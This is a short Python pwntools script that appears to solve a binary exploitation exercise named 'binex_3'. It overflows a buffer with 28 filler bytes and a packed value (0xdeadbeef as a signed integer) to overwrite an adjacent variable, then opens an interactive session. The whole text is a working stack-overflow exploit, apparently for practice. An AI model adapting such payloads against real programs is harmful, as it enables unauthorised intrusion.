from pwn import *

io = process('./binex_3')

payload = flat([
    b'A'*28,
    -0x21524111
])

io.sendline(payload)
io.interactive()